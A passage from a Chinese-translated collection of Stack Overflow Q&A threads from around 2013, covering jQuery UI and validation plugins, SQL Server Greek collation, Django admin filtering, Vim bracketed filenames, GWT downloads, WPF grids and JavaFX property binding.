<link rel="stylesheet" href="http://code.jquery.com/ui/1.10.1/themes/base/jquery-ui.css" />
<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
<script src="http://code.jquery.com/ui/1.10.1/jquery-ui.js"></script>
<link rel="stylesheet" href="/resources/demos/style.css" />
<script>
    $(function () 
    {
        var availableTags = ["ActionScript", "AppleScript", "Asp", "BASIC", "C", "C++", "Clojure", "COBOL", "ColdFusion", "Erlang", "Fortran", "Groovy", "Haskell", "Java", "JavaScript", "Lisp", "Perl", "PHP", "Python", "Ruby", "Scala", "Scheme"];
        $("#tags").autocomplete({ source: availableTags });
    });
</script>
</head>
<body>
<form id="form1" runat="server">
    <div class="ui-widget">
        <label for="tags">Tags: </label>
        <input type="text" id="tags" />
    </div>
</form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T05:20:31.133

它通过使用内部 Jquery 文件和 noconflict 函数来解决。

```
<script src="/JqueryPlugins/ui/jquery.ui.core.js" type="text/javascript"></script>
<script src="/JqueryPlugins/ui/jquery.ui.widget.js" type="text/javascript"></script>
<script src="/JqueryPlugins/ui/jquery.ui.position.js" type="text/javascript"></script>
<script src="/JqueryPlugins/ui/jquery.ui.autocomplete.js" type="text/javascript"></script>
<script>
$J = jQuery.noConflict();
$J(function () 
{
    var availableTags = ["ActionScript", "AppleScript", "Asp", "BASIC", "C", "C++", "Clojure", "COBOL", "ColdFusion", "Erlang", "Fortran", "Groovy", "Haskell", "Java", "JavaScript", "Lisp", "Perl", "PHP", "Python", "Ruby", "Scala", "Scheme"];
    $J("#tags").autocomplete({ source: availableTags });
});
</script> 
```

# hyperlink - 电子邮件链接无法在 Outlook 上打开

> ID：15110897
> 
> 赞同：1
> 
> 时间：2013-02-27T11:24:22.463
> 
> 标签：hyperlink, outlook, html-email

在我的项目中，我集成了用于重置密码选项的 html 电子邮件。用户单击链接，如果用户提交他的电子邮件，他将收到包含重置密码链接的邮件。该链接正在 Gmail 上打开。但是当我在 Out look 中打开时，相同的链接不起作用。这是不可点击的模式。html电子邮件不会在Outlook上锻炼吗？或编码集成所需的任何更改。请回复？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T06:17:02.190

最后我解决了这个问题。在我的网页中有一些注释代码。当我现在删除注释代码时，邮件正常发送并且所有链接都正常工作。我相信这个注释代码对前景的安全问题有一些影响。因此，当编写邮件功能等时，需要使页面非常干净，并且应该删除所有不需要的评论等。

# sql-server - 带有希腊语的 SQL Server 表排序规则

> ID：15110901
> 
> 赞同：1
> 
> 时间：2013-02-27T11:24:59.103
> 
> 标签：sql-server, collation

我在 SQL Server 中有两个带有排序规则的表`SQL_Latin1_General_CP1_CI_AS`

**表A**

```
columnA1    varchar(100),
columnA2    varchar(100) 
```

**表B**

```
columnB1    varchar(100) 
```

我在 中插入一行`TableA`，用

```
columnA1 -> a value coming from a form of a 'UTF-8' page
columnA2 -> the value of columnB1 from TableB 
```

这两个值都是希腊语。

问题是当我选择新插入的行时，`columnA1`显示正确的值（带有希腊字母），但`columnA2`显示`???`而不是希腊字母。

当我选择`columnB1`时`TableB`显示带有希腊字母的值

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:15:12.553

我找到了。错误在于列的整理。两个表都有一个`SQL_Latin1_General_CP1_CI_AS`排序规则，`columnA2`and 也是`columnB1`，但是`columA1`有一个`SQL_Latin1_General_CP1253_CI_AI`排序规则，所以这就是它正确显示希腊语的原因

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-02-27T04:11:41.437

不要忘记在 Unicode 字符串常量前加上字母**N**来表示 UCS-2 或 UTF-16 输入。

```
INSERT INTO Table (Col) VALUES (N'Ελληνικά') 
```

[MSDN 引用](https://docs.microsoft.com/en-us/sql/t-sql/data-types/nchar-and-nvarchar-transact-sql?redirectedfrom=MSDN&view=sql-server-ver15#remarks)

# desktop-application - libGDX 是否适合纯桌面应用程序开发？

> ID：15110902
> 
> 赞同：4
> 
> 时间：2013-02-27T11:24:59.917
> 
> 标签：desktop-application, game-engine, libgdx

我目前有几个月的时间通过书籍和在线教程自学 Java。陡峭的学习曲线。由于我是在空闲时间做这件事的，所以我几乎没有希望很快在语言的各个方面都变得非常好。我创建了使用 lwjgl 绘制图形的简单程序。

我正在寻找一个框架/库来帮助我尽可能多地处理技术底层的东西。我宁愿专注于编写游戏，也不愿成为 OpenGL 天才或从头开始发明 GUI，因为“那里”有比我做得更好的库。我根本无法投入所需的时间，但仍然喜欢编写自己的游戏。

考虑到我只想编写仅限桌面的应用程序，您会为此目的推荐 libGDX 吗？或者它更像是一个也恰好在桌面上运行的 Android-API（用于调试？）。是否有更适合桌面应用程序的替代方案？

到目前为止，我真的很喜欢我所读到的关于 libGDX 的内容，它似乎为游戏开发的各个方面提供了有用的工具。我只是不想花几个月的时间来学习它，只是发现 XY 库在桌面应用程序方面会更好。

感谢您的意见，任何帮助表示赞赏！

简

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T13:19:08.590

出于以下原因，我个人会为此目的推荐 libgdx：

*   它为 Box2D、OpenGL ES 和 FreeType 等库提供了大量包装器，无论是在核心库中还是通过扩展。
*   它包含许多您可能需要实现的[功能](http://libgdx.badlogicgames.com/features.html)，例如纹理图集、网格、平铺地图、JSON 序列化等。
*   它是无主见的，即，您可以选择使用哪些部分，而不会被迫采用“libgdx 方式”做事。
*   它得到了积极的发展，并拥有一个强大、乐于助人、[知识渊博的社区](http://badlogicgames.com/forum/)。
*   它非常易于跨平台移植，因此您在 Windows 上开发的内容可以在 Mac 上运行，反之亦然。

# android - 通过 json parse 构建 jQuery 移动页面的最佳实践

> ID：15110905
> 
> 赞同：2
> 
> 时间：2013-02-27T11:25:20.937
> 
> 标签：android, jquery, json, cordova, jquery-mobile

我正在使用 phonegap 开发一个 android 应用程序，它在页面加载时调用一个 api，获取一个 json 对象作为返回参数。

现在我必须通过从收到的对象中提取值来使用 jQuery mobile 构建页面。

所以我在问什么是可以减少加载时间的最佳实践。

感谢您的帮助。

目前我在做什么

```
<script>
    $(document).ready( function() {
        $.ajax({
            url : "demourl.com",
            type : "GET",
            success : function(data) {
                var obj = $.parseJSON(data);
                $("#results").html(obj.messagedetails[0].spamReason.userApprove);},
            fail : function() {
                $("#notification").text("Try again after some time.");
            }
        });
    });
</script> 
```

从此调用中获取对象并将其设置为

```
<div id="results"></div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:35:58.240

1.  There's nothing you can do about **`$.ajax`** / **`$.getJSON`** loading time, it will depend on your internet connection.

2.  Never load data during the page transitions, do it ether before page change or after a page change. Best practice is to do it before page change (just show **`AJAX`** loader to indicate **`AJAX`** content is loading).

3.  When data is loaded use .**`append(`** and not **`.html(`** to append data.

4.  In case you are using **`each`** or **`for loop`** to add a dynamic content (laoded with an **`AJAX`**) **UNDER NO CIRCUMSTANCES** enhance page markup (apply **`jOuery Mobile`** style to new added content) during each loop, **THIS IS A HUGE TIME SINK**, do it only after all content has been added.

    You can find more about this in my **[ARTICLE](http://www.gajotres.net/jquery-mobile-and-how-to-enhance-the-markup-of-dynamically-added-content/)**, or find it **[HERE](https://stackoverflow.com/a/14550417/1848600)**.

5.  Do not use **`document ready`**, it could trigger before page is loaded. Instead use correct page event.

    Find more about **`document ready`** vs **`page events`** in my other **[ARTICLE](http://www.gajotres.net/document-onpageinit-vs-document-ready/)**, here you will also find a way to benchmark jQuery Mobile and some statistic about how much time is needed for some jQM actions.

# javascript - 无法在 RHEL5 中将焦点转移到 Firefox 中的另一个文本输入

> ID：15110907
> 
> 赞同：0
> 
> 时间：2013-02-27T11:25:26.643
> 
> 标签：javascript, jquery, html, focus

我正在尝试这个简单的代码：

```
<!DOCTYPE html>
<html>
<head>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js">
</script>
<script>
$(document).ready(function(){
  $(".foo").bind("contextmenu",function(){
     $(".boo").focus();      
  });
});
</script>
</head>
<body>
<input type = 'text' class = 'foo' /><input type = 'text' class = 'boo' />
</body>
</html> 
```

它应该做的是当右键单击第一个文本输入时将焦点转移到第二个文本输入。这在 Windows 上的浏览​​器中运行良好，但`RHEL5`在 Firefox 中检查时，这不会发生，并且重点仍然放在第一个上。

我试图将逻辑更改为如下所示：

```
$(".foo").click(function(e) {
   if (e.which == 3)
     $(".boo").focus();
}); 
```

它仍然不起作用。但是，如果我将最后一个代码更改为`if (e.which == 1)...`，则焦点会转移到单击上，而不是右键单击。这个问题发生在`RHEL5`Firefox 和 Mac 中的 Firefox、Chrome 中。但是，它在 Mac 上的 Safari 和 Opera 中运行良好。

我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:52:37.363

先把你的输入类改成ID，这里比较合适

```
<input type="text" id="foo" /><input type="text" id="boo" /> 
```

然后试试这个，简单的 Javacript，不需要 jQuery。

```
document.getElementById("foo").onfocus = function(){
  document.getElementById("boo").focus();
} 
```

编辑：在 OP 的原始代码中使用超时的工作解决方案：

```
setTimeout(function(){$(".boo").focus()}, 0) 
```

使用超时，它也可以与上面的代码一起工作。

# django - 使用多个数据库在管理员中的 Django 自定义过滤器

> ID：15110908
> 
> 赞同：0
> 
> 时间：2013-02-27T11:25:27.837
> 
> 标签：django, django-queryset, django-filters

我有多个数据库，一个由 Django 管理，一个外部包含用于使用 SimpleListFilter 在 Django 管理员内部过滤的相关信息。由于 Django 的限制，我没有跨数据库的外键，我正在外部数据库中进行查找以获取例如目标版本号。基于该查找列表，我能够减少我的查询集。

现在的问题是我的数据库太大而无法以这种方式过滤，因为生成的 SQL 查询如下所示：

```
SELECT 'status'.'id', 'status'.'service_number', 'status'.'status'
    FROM 'status'
    WHERE ('status'.'service_number' = '01xxx'  OR 'status'.'service_number' = '02xxx'  OR 'status'.'service_number' = '03xxx' ...... 
```

OR 的列表太长，无法再在数据库中进行 reduce，收到的错误是：

```
Django Version: 1.4.4
Exception Type: DatabaseError
Exception Value:    (1153, "Got a packet bigger than 'max_allowed_packet' bytes") 
```

我已经在 MySQL 中增加了 max_allowed_pa​​cket，但是这次我认为再次增加该值不是正确的方法。更改

我的 SimpleListFilter 看起来像：

```
class TargetFilter(SimpleListFilter):
    parameter_name = 'target'

    def lookups(self, request, model_admin):
        return (
            ('v1', 'V1.0'),
            ('v2', 'V2.0'),
        )

    def queryset(self, request, queryset):
        if self.value():
            lookup = []
            for i in Target.objects.using('externaldb').filter(target=self.value()).values('service_number').distinct():
                lookup.append(str(i['service_number']))
            qlist = [Q(**{'service_number': f}) for f in lookup]
            queryset = queryset.filter(reduce(operator.or_, qlist))
            return queryset 
```

列出的代码工作了多年，但变得越来越慢，现在根本不起作用。我试过使用frozensets，但这似乎不起作用。你知道如何减少非常大的集合吗？

感谢您的任何提示！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-04-07T22:41:47.227

玩游戏有点太晚了，但我几周前才开始使用 Django，而且我有很大的桌子可以使用。对于大型查询，我在 Django 中使用 RAW Sql 和游标实际上是为了限制返回的输出，并分批处理它。查询集获取所有内容并将其加载到内存中，这在大型部署中并不实用。

查看[https://docs.djangoproject.com/en/3.0/topics/db/sql/](https://docs.djangoproject.com/en/3.0/topics/db/sql/)更具体地说直接执行自定义 SQL

# bash - Vim：当“1”存在时编辑“[1]”的便携方式

> ID：15110909
> 
> 赞同：4
> 
> 时间：2013-02-27T11:25:27.947
> 
> 标签：bash, vim, cmd, cygwin

所以，我想编辑文件`[1]`。问题是，我还有一个名为`1`. 我还使用 cygwin 及其`bash`shell、win32`cmd`和 Linux。有时我使用 cygwin 的`vim`，有时我使用 win32`vim`和`gvim`.

我找不到打开文件的一致方式`[1]`。通常`vim`会`[1]`被视为一个文件 glob，并`1`改为打开。

在linux中，`:e [1]`失败，但`:e \[1]`有效。在win32中，`:e \[1]`失败。

我似乎陷入了一个曲折的迷宫迷宫，其中涉及`fnameescape()`、`shellslash`和`isfname`选项，以及 win32`vim`试图`\`作为路径分隔符处理。

**啊哈！**

`:e [[]1]`似乎工作（？）。肯定有一些“官方”的方式（比如调用 vim 函数）来达到这种模式吗？（**编辑**：不，这仅在`[1]` *已经*存在时才有效。叹息。）

**编辑**

在 Ingo Karkat 的回答之后，我的文件加载 bash 脚本现在包含以下代码段：

```
# Double single quotes are single quotes in a single-quoted vim string (got that?)
FILE=${FILE//\'/\'\'}
[[ -n $FILE ]] && gvim -u NONE -U NONE -f --remote-send '<c-\><c-n>:let b = bufwinnr('\'"$FILE"\'')|if b != -1|exec b "wincmd w"|else|new `='\'"$FILE"\''`|endif<cr>'
gvim -u NONE -U NONE -e -s --cmd 'let a = remote_foreground("GVIM")|q' 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-27T11:51:20.237

有：

```
:edit `='[1]'` 
```

这（错误？-）使用反引号扩展作为 Vim 表达式 ( `:help `=`)。不利的一面是，该模式现在很容易使用该`'wildignore'`选项进行过滤。

我们曾经[对这个问题进行了长时间的讨论](http://groups.google.com/group/vim_dev/browse_thread/thread/1476bde8469404ea/6c4b27d92c70c6da)；但它以某种方式失败了，没有采取任何行动。所以目前，文件名的字面使用也可以被解释为文件 glob 是毛茸茸的，大多数插件都处理得不好（包括我的），因为帮助中的一致建议是使用`fnamescape()`，它不能处理这个。

# ruby-on-rails-3 - Turbolinks 与 JS MVC 框架？

> ID：15110910
> 
> 赞同：4
> 
> 时间：2013-02-27T11:25:30.587
> 
> 标签：ruby-on-rails-3, model-view-controller, ember.js, ruby-on-rails-4, turbolinks

我们已经将 EmberJS 应用为框架并使用 Rails 3.2 来迁移到 Rails 4.0 Rails 社区正在为 turbolinks 进行大量推送，一方面我们的网站与客户端框架配合得很好。EmberJS 为在我们需要的末端编写自定义代码提供了很好的支持。

我的问题是人们如何将 turbolinks 视为制作动态页面的一种方式。与 turbolinks 一起隐含意味着我们必须尽可能精简 Javascript（这意味着任何 JS 框架都是多余的）。那么，我们如何看待 JS 框架的增长/支持以及 turbolinks 是否会成为事实。

现在是开始扩大 turbolink 的合适时机吗？有哪些好的参考资料。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-02T07:13:29.527

Turbolinks 不会取代 ember。这真的是一个苹果与橘子的比较。

Turbolinks 不是一种制作动态页面的方法，它只是一种通过替换正文内容来使您的网站更快的方法。

如果你已经在使用 Ember，你应该忽略 turbolinks。

# gwt - 如何使用 GWT 将文件从服务器下载到本地驱动器

> ID：15110913
> 
> 赞同：0
> 
> 时间：2013-02-27T11:25:36.840
> 
> 标签：gwt

我想要的是用户可以在他的本地驱动器中选择一个完整的路径，然后一个文件（现在在我的应用程序的 war 文件夹中）将保存在该选定的用户位置

我正在使用 GWT 中的文件上传来上传我的文件，它工作正常，我也会使用 FileUpload 进行下载吗？

如果有可能获得用户选择的位置，例如 d:\downloadfolder，第二个选项，我的问题会解决，剩下的我会做！

以下是上传代码，请帮我下载

```
final String UPLOAD_ACTION_URL = GWT.getModuleBaseURL() + "upload";
initWidget(panelImages);
final FormPanel form = new FormPanel();
form.setAction(UPLOAD_ACTION_URL);

form.setEncoding(FormPanel.ENCODING_MULTIPART);
form.setMethod(FormPanel.METHOD_POST);

VerticalPanel panel = new VerticalPanel();
form.setWidget(panel);

FileUpload upload = new FileUpload();
upload.setName("uploadFormElement");
panel.add(upload);

// Add a 'submit' button.
panel.add(new Button("Submit", new ClickHandler() {
    public void onClick(ClickEvent event) {
        form.submit();
    }
}));

form.addSubmitCompleteHandler(new FormPanel.SubmitCompleteHandler() {
    public void onSubmitComplete(SubmitCompleteEvent event) {
        if(event.getResults().contains("DataBase Restored")){
            Window.alert("Database Restored !");
        }
    }
});

panelImages.add(form); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T15:15:28.727

您不能从 GWT 执行此操作，因为 JavaScript 无法访问本地硬盘驱动器。您能做的最好的事情就是正常启动下载（例如，显示指向用户可以单击的文件的链接）。根据他们的浏览器设置，他们将选择文件的位置，或者将其下载到某个默认位置。你不能只用 JavaScript 知道那个位置。

如果这是项目要求，我认为您需要包含一个重量级的插件，如 java 或 flash。

# c# - Lee 算法的 C# Windows 窗体图形组件

> ID：15110916
> 
> 赞同：0
> 
> 时间：2013-02-27T11:25:41.780
> 
> 标签：c#, winforms, interactive, graphic

我的任务是编写一个简单的 Lee 算法演示程序，用于在迷宫中寻路。我想让它有点图形交互：创建一个具有可变数量的行和列的 2D 表，可以单击其单元格（并且应该能够跟踪单击的单元格的位置）。这是因为我想让用户绘制迷宫障碍物、设置起点等。可以帮助我做到这一点的最佳图形组件是什么，我如何与它的单元格交互？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:48:19.267

根据您的评论，我会说 WPF 是这项任务的更自然的候选者，因为它被设计用于执行自定义布局的东西。这是一个代码示例，我使用带有统一网格的项目控件组合在一起，该网格显示单元格网格 - 单击单元格将其选中，再次单击将取消选中它。

这不是很好的 WPF，但它可能会给您一些想法并帮助您入门。

**应用：**

![应用示例图片](../Images/a2329e48ab399ae007450a251ecb35e9.png)

**XAML：**

```
<Window x:Class="LeeAlgorithm.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow" Height="380" Width="350">
    <Grid>
        <ItemsControl ItemsSource="{Binding Cells}">
            <ItemsControl.ItemsPanel>
                <ItemsPanelTemplate>
                    <UniformGrid Columns="5" />
                </ItemsPanelTemplate>
            </ItemsControl.ItemsPanel>
            <ItemsControl.ItemTemplate>
                <DataTemplate>
                    <DataTemplate.Resources>
                        <Style TargetType="TextBlock">
                            <Setter Property="FontSize" Value="18"/>
                            <Setter Property="HorizontalAlignment" Value="Center"/>

        </Style>
                </DataTemplate.Resources>
                <Grid Width="30" Height="30" Margin="2">
                    <DockPanel ZIndex="9999">
                        <!-- This is a hack to capture the mouse click in the area of the item -->
                        <Rectangle 
                            Fill="Transparent" 
                            DockPanel.Dock="Top" 
                            MouseDown="UIElement_OnMouseDown" 
                            Tag="{Binding}" />
                    </DockPanel>
                    <Grid>
                    <Rectangle Fill="{Binding Path=Color}" Stroke="Red" StrokeDashArray="1 2" />
                    <TextBlock Margin="3,3,3,0" Text="{Binding Path=CellNumber}"/>
                    </Grid>
                </Grid>
            </DataTemplate>
        </ItemsControl.ItemTemplate>
    </ItemsControl>
</Grid> 
```

**后面的代码（您的 MainWindow.xaml.cs 代码）：**

```
namespace LeeAlgorithm
{
    using System.Collections.ObjectModel;
    using System.ComponentModel;
    using System.Windows;
    using System.Windows.Input;
    using System.Windows.Media;
    using System.Windows.Shapes;

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            this.Cells = new ObservableCollection<Cell>();

            for (int i = 0; i != 50; ++i)
            {
                this.Cells.Add(new Cell { CellNumber = i });
            }

            InitializeComponent();

            DataContext = this;
        }

        public ObservableCollection<Cell> Cells { get; private set; }

        private void UIElement_OnMouseDown(object sender, MouseButtonEventArgs e)
        {
            var cell = (Cell)((Rectangle)sender).Tag;

            if (!cell.IsSelected)
            {
                cell.Color = new SolidColorBrush(Colors.HotPink);
                cell.IsSelected = true;
            }
            else
            {
                cell.Color = new SolidColorBrush(Colors.Silver);
                cell.IsSelected = false;
            }
        }
    }

    public class Cell : INotifyPropertyChanged
    {
        private int cellNumber;

        private SolidColorBrush color = new SolidColorBrush(Colors.Silver);

        public event PropertyChangedEventHandler PropertyChanged;

        public int CellNumber
        {
            get
            {
                return this.cellNumber;
            }
            set
            {
                if (value == this.cellNumber)
                {
                    return;
                }
                this.cellNumber = value;
                this.OnPropertyChanged("CellNumber");
            }
        }

        public SolidColorBrush Color
        {
            get
            {
                return this.color;
            }
            set
            {
                if (Equals(value, this.color))
                {
                    return;
                }
                this.color = value;
                this.OnPropertyChanged("Color");
            }
        }

        public bool IsSelected { get; set; }

        protected virtual void OnPropertyChanged(string propertyName)
        {
            var handler = PropertyChanged;
            if (handler != null)
            {
                handler(this, new PropertyChangedEventArgs(propertyName));
            }
        }
    }
} 
```

快乐编码！

# android - Android chrome浏览器自定义检查输入不起作用

> ID：15110917
> 
> 赞同：1
> 
> 时间：2013-02-27T11:25:47.833
> 
> 标签：android, jquery, html, mobile, checkbox

我有一个标题列表。每行都有一个自定义复选框。如果我单击复选框，它应该更改`<img>`标记源属性。在PC浏览器上它运行良好，但在我的手机上图像没有改变。

```
<div class='my-list' onClick='myFunction(this);'>
    <img src='' alt='' />
    <input type='hidden' name='selected' value='0' />
</div>

function myFunction(obj){

    if( $(obj).find('input').val() == '0' ){
        $(obj).find('input').val('1');
        $(obj).find('img').attr('src', 'images/check.gif');
    }
    else{
        $(obj).find('input').val('0');
        $(obj).find('img').attr('src', '');
    }

} 
```

第一次单击它正在工作，但如果我想取消选中，图像仍保留在 div 中。正如我所说，它在我的 PC 浏览器上运行，但在我的移动设备上，图像标签源没有改变。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:53:30.723

试试这个：

```
<div class='my-list'>check box</div>
<img src='http://a.fsdn.com/allura/p/handbrake/icon' id='image' style='display: none;' />

$('.my-list').click(function() {    
  var image = '#image';   
  if($(image).css('display') == 'none') {  
    $(image).show();
  } else {
    $(image).hide();
  }    
}); 
```

在这里测试：http: [//jsfiddle.net/MsGtL/](http://jsfiddle.net/MsGtL/)

# facebook - Facebook 图标和按钮是否受版权保护？

> ID：15110923
> 
> 赞同：0
> 
> 时间：2013-02-27T11:26:01.757
> 
> 标签：facebook, copyright-display

我喜欢使用一些 facebook 按钮和图标，比如这些

![在此处输入图像描述](../Images/502ad5ae78b5e48f67f43ad575f23c02.png)

![在此处输入图像描述](../Images/44b9309e7d1e348ec8d1930ab6d2eefa.png)

可以使用吗？在他们的[品牌许可中心](http://www.facebook.com/brandpermissions/logos.php)，图标和那个按钮没有显示。我找不到关于这个问题的文章。

有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:17:18.100

所有图标和图像的版权均归 Facebook 所有，因此您应在使用前征得许可。作为预防措施，最好就品牌许可中心未涵盖的图像/图标的使用联系 Facebook。

# jquery - 为更多字段设置相同的属性

> ID：15110928
> 
> 赞同：1
> 
> 时间：2013-02-27T11:26:10.203
> 
> 标签：jquery, jquery-validate, validation

我有两个或更多文本字段，我想对它们应用相同的属性，避免编写两次或更多次相同的代码

这不起作用：

```
$("#form").validate({  
    rules:  
    {
    'name', 'surname':{  
        required: true,  
        minlength: 3,
        maxlength: 50   
        }
    }
}); 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:28:38.987

将 CSS 类应用于所有字段

```
$(".cssClassName").rules("add", {
        required: true,  
         minlength: 3,
          maxlength: 50 ,
        messages:
   {required:"error1",minlength:"error2",maxlength:"error3"}}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:28:52.917

将您的属性定义为变量，然后使用它：

```
var name_reqs = {  
     required: true,  
    minlength: 3,
    maxlength: 50   
};

$("#form").validate({  
    rules: {
           'name': name_reqs,
        'surname': name_reqs
    }
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:41:04.073

像这样试试

```
var ruleSet1 = {
        required: true,  
        minlength: 3,
        maxlength: 50
    };

$('#form').validate({
    rules: {
        field_1: ruleSet1,
        field_2: ruleSet1,
        field_3: ruleSet1
    }
}); 
```

或者像下面这样一个一个地做，

```
$("#form").validate({  
    rules:  
    {
    name: { required: true },
    surname:{  
        required: true,  
        minlength: 3,
        maxlength: 50   
        }
    }
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-27T12:02:42.447

显然有几种方法可以做到这一点，但如果你使用[**类规则：**](http://docs.jquery.com/Plugins/Validation/Validator/addClassRules#namerules)

```
$.validator.addClassRules("name", {
  required: true,  
  minlength: 3,
  maxlength: 50
}); 
```

然后你可以像这样设置你的规则

```
$("#form").validate({  
    rules:  
    {
     firstname : name, 
     surname : name
    }
}); 
```

或使用类名设置规则：

```
<input id="firstname" name="firstname" class="name">
<input id="surname" name="surnname" class="name"> 
```

此方法在 jQuery 验证通用指南的[重构规则](http://docs.jquery.com/Plugins/Validation/Reference#Refactoring_rules)部分中进行了讨论。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-27T15:37:48.640

取自[我之前的回答](https://stackoverflow.com/a/9461732/594235)：

* * *

就我的示例而言，这是基本的起始代码：

**HTML**：

```
<input type="text" name="field_1" />
<input type="text" name="field_2" />
<input type="text" name="field_3" /> 
```

**jQuery** :

```
$('#myForm').validate({
    rules: {
        field_1: {
            required: true,
            number: true
        },
        field_2: {
            required: true,
            number: true
        },
        field_3: {
            required: true,
            number: true
        }
    }
}); 
```

**演示**：http: [//jsfiddle.net/rq5ra/](http://jsfiddle.net/rq5ra/)

* * *

**选项 1a)** 您可以根据所需的通用规则将类分配给您的字段，然后将这些规则分配给类。您还可以分配自定义消息。

HTML：

```
<input type="text" name="field_1" class="num" />
<input type="text" name="field_2" class="num" />
<input type="text" name="field_3" class="num" /> 
```

该[`.rules('add')`方法](http://docs.jquery.com/Plugins/Validation/rules#.22add.22rules) **必须**在调用*后*调用`.validate()`，并且`.each()`必须用于以`class`.

jQuery：

```
$('#myForm').validate({
    // your other plugin options
});

$('.num').each(function() {
    $(this).rules('add', {
        required: true,
        number: true,
        messages: {
            required:  "your custom message",
            number:  "your custom message"
        }
    });
}); 
```

**演示**：http: [//jsfiddle.net/rq5ra/1/](http://jsfiddle.net/rq5ra/1/)

**选项 1b)** 与上面相同，但不使用 a `class`，而是匹配 name 属性的公共部分：

```
$('[name*="field"]').each(function() {
    $(this).rules('add', {
        required: true,
        number: true,
        messages: { // optional custom messages
            required:  "your custom message",
            number:  "your custom message"
        }
    });
}); 
```

**演示**：http: [//jsfiddle.net/rq5ra/6/](http://jsfiddle.net/rq5ra/6/)

* * *

**选项 2a)** 您可以提取规则组并将它们组合成公共变量。

```
var ruleSet1 = {
        required: true,
        number: true
    };

$('#myForm').validate({
    rules: {
        field_1: ruleSet1,
        field_2: ruleSet1,
        field_3: ruleSet1
    }
}); 
```

**演示**：http: [//jsfiddle.net/rq5ra/4/](http://jsfiddle.net/rq5ra/4/)

* * *

**选项 2b)**与上述 2a 相关，但取决于您的复杂程度，可以分离出某些组共有的规则，并用于[`.extend()`](http://api.jquery.com/jQuery.extend/)以无限多种方式重新组合它们。

```
var ruleSet_default = {
        required: true,
        number: true
    };

var ruleSet1 = {
        max: 99
    };
$.extend(ruleSet1, ruleSet_default); // combines defaults into set 1

var ruleSet2 = {
        min: 3
    };
$.extend(ruleSet2, ruleSet_default); // combines defaults into set 2

var ruleSet3 = { };
$.extend(ruleSet3, ruleSet1, ruleSet2); // combines sets 2 & 1 into set 3\.  Defaults are included since they were already combined into sets 1 & 2 previously.

$('#myForm').validate({
    rules: {
        field_1: ruleSet2,
        field_2: ruleSet_default,
        field_3: ruleSet1,
        field_4: ruleSet3
    }
}); 
```

最终结果：

*   `field_1`将是一个不小于 3 的必需数量。
*   `field_2`将只是一个必需的数字。
*   `field_3`将是不大于 99 的必需数字。
*   `field_4`将是 3 到 99 之间的必填数字。

**演示**：http: [//jsfiddle.net/rq5ra/5/](http://jsfiddle.net/rq5ra/5/)

# java - 常规变量的 ObservableList 概念（没有 TableView）

> ID：15110929
> 
> 赞同：1
> 
> 时间：2013-02-27T11:26:20.240
> 
> 标签：java, javafx-2, fxml

在我为 JavaFX 找到的每个示例中，都有`TableView`（使用`setCellValueFactory`on`TableColumn`和`setItems`on `TableView`）。

我怎样才能做一个可观​​察的对象？

例如，如果我有以下 fxml（值将由第三方控制器更改）：

```
<fx:root type="GridPane" xmlns:fx="http://javafx.com/fxml" fx:controller="AStringAndAnIntController">
    <Label text="random string" GridPane.columnIndex="0" GridPane.rowIndex="0"/>
    <Label fx:id="str" GridPane.columnIndex="0" GridPane.rowIndex="1"/>
    <Label text="random int" GridPane.columnIndex="1" GridPane.rowIndex="0"/>
    <Label fx:id="integer" GridPane.columnIndex="1" GridPane.rowIndex="1"/>
</fx:root> 
```

和一个模型对象：

```
public class AStringAndAnInt{
    private String str;
    private int integer;
    //with its setters and getters
} 
```

我应该在控制器中做什么来将我的对象与 JavaFX 控件链接起来？

```
public class AStringAndAnIntController extends GridPane implements Initializable{
    @FXML Label str;
    @FXML Label integer;

    @Override public void initialize(URL arg0, ResourceBundle arg1){
    }
    public void setAStringAndAnInt(AStringAndAnInt strint){
        //what would go inside? a ObserbableList.add(strint)?
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:44:12.877

您需要使用[JavaFX 属性和绑定](http://docs.oracle.com/javafx/2/binding/jfxpub-binding.htm)来获得可观察的值。

```
public class AStringAndAnInt{
    private StringProperty str = new SimpleStringProperty();
    private IntegerProperty integer = new SimpleIntegerProperty();

    public String getStr() {
        return str.getValue();
    }

    public void setStr(String value) {
        str.set(value);
    }

    public StringProperty strProperty() {
        return str;
    }

    public int getInteger() {
        return integer.getValue();
    }

    public void setInteger(int value) {
        integer.set(value);
    }

    public IntegerProperty integerProperty() {
        return integer;
    }
} 
```

所以在你的控制器中你可以写：

```
public class AStringAndAnIntController extends GridPane implements Initializable{
    @FXML Label str;
    @FXML Label integer;

    @Override public void initialize(URL arg0, ResourceBundle arg1){
    }
    public void setAStringAndAnInt(AStringAndAnInt strint){
        str.textProperty().bind(strint.strProperty());
        integer.textProperty().bind(strint.integerProperty().asString());
    }
} 
```

# java - 如何使用 zk 框架创建基于会话和角色的访问

